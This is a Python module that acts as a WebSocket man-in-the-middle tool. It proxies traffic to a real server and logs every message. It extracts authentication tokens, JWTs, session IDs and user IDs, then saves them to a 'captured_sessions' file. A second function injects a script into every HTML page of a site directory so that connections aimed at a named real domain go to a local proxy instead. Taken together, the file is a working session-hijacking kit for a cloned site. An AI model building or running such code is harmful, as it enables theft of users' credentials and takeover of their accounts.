"""WebSocket interceptor and session capture"""
import logging
import json
from datetime import datetime
from pathlib import Path
import threading
import websocket
from flask_sock import Sock

logger = logging.getLogger(__name__)

class WebSocketInterceptor:
    """Intercepts and logs WebSocket traffic"""
    
    def __init__(self, output_file: str = "websocket_capture.json"):
        self.output_file = Path(output_file)
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        self.captured_messages = []
        self.sessions = {}
        self.lock = threading.Lock()
    
    def log_message(self, direction: str, message: str, session_id: str = None):
        """Log WebSocket message"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "direction": direction,
            "message": message,
            "session_id": session_id
        }
        
        with self.lock:
            self.captured_messages.append(entry)
            
            # Save to file
            with open(self.output_file, 'w') as f:
                json.dump(self.captured_messages, f, indent=2)
        
        # Print to console
        print(f"\n{'='*60}")
        print(f"🔌 WebSocket {direction.upper()}")
        print(f"{'='*60}")
        print(f"Time: {entry['timestamp']}")
        if session_id:
            print(f"Session: {session_id}")
        print(f"Message: {message[:200]}...")
        print(f"{'='*60}\n")
        
        logger.info(f"WS {direction}: {message[:100]}")
    
    def extract_session(self, message: str):
        """Extract session/auth tokens from message"""
        try:
            data = json.loads(message)
            
            # Look for common session fields
            session_fields = ['token', 'session', 'auth', 'jwt', 'access_token', 
                            'sessionId', 'userId', 'user_id']
            
            for field in session_fields:
                if field in data:
                    session_value = data[field]
                    print(f"\n{'='*60}")
                    print(f"🎯 SESSION CAPTURED!")
                    print(f"{'='*60}")
                    print(f"Field: {field}")
                    print(f"Value: {session_value}")
                    print(f"{'='*60}\n")
                    
                    self.sessions[field] = session_value
                    
                    # Save sessions separately
                    session_file = self.output_file.parent / "captured_sessions.json"
                    with open(session_file, 'w') as f:
                        json.dump(self.sessions, f, indent=2)
        except:
            pass
    
    def setup_websocket_proxy(self, app, target_ws_url: str):
        """Setup WebSocket proxy route"""
        sock = Sock(app)
        interceptor = self
        
        @sock.route('/ws')
        def websocket_proxy(ws):
            """Proxy WebSocket connection and capture traffic"""
            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            try:
                # Connect to real WebSocket
                real_ws = websocket.create_connection(
                    target_ws_url,
                    timeout=10
                )
                
                interceptor.log_message("connect", f"Connected to {target_ws_url}", session_id)
                
                # Bidirectional proxy
                def forward_from_client():
                    while True:
                        try:
                            msg = ws.receive()
                            if msg:
                                interceptor.log_message("client->server", msg, session_id)
                                interceptor.extract_session(msg)
                                real_ws.send(msg)
                        except Exception as e:
                            logger.error(f"Client forward error: {e}")
                            break
                
                def forward_from_server():
                    while True:
                        try:
                            msg = real_ws.recv()
                            if msg:
                                interceptor.log_message("server->client", msg, session_id)
                                interceptor.extract_session(msg)
                                ws.send(msg)
                        except Exception as e:
                            logger.error(f"Server forward error: {e}")
                            break
                
                # Start forwarding threads
                client_thread = threading.Thread(target=forward_from_client, daemon=True)
                server_thread = threading.Thread(target=forward_from_server, daemon=True)
                
                client_thread.start()
                server_thread.start()
                
                # Wait for threads
                client_thread.join()
                server_thread.join()
                
            except Exception as e:
                logger.error(f"WebSocket proxy error: {e}")
                interceptor.log_message("error", str(e), session_id)
        
        return sock


def inject_websocket_interceptor(site_dir: str, ws_url: str = "wss://pakamia.ke/ws"):
    """Inject JavaScript to redirect WebSocket to our proxy"""
    html_files = list(Path(site_dir).rglob("*.html"))
    
    # JavaScript to intercept WebSocket
    intercept_script = f"""
<script>
// Intercept WebSocket connections
(function() {{
    const OriginalWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {{
        // Redirect to our proxy
        const proxyUrl = url.replace('wss://pakamia.ke', 'ws://localhost:8080')
                           .replace('ws://pakamia.ke', 'ws://localhost:8080');
        console.log('WebSocket intercepted:', url, '->', proxyUrl);
        return new OriginalWebSocket(proxyUrl, protocols);
    }};
}})();
</script>
"""
    
    modified = 0
    for html_file in html_files:
        try:
            with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Inject before </head> or at start of <body>
            if '</head>' in content:
                content = content.replace('</head>', f'{intercept_script}</head>')
            elif '<body>' in content:
                content = content.replace('<body>', f'<body>{intercept_script}')
            else:
                content = intercept_script + content
            
            with open(html_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            modified += 1
        except Exception as e:
            logger.error(f"Failed to inject WebSocket interceptor in {html_file}: {e}")
    
    logger.info(f"Injected WebSocket interceptor in {modified} files")
    return modified
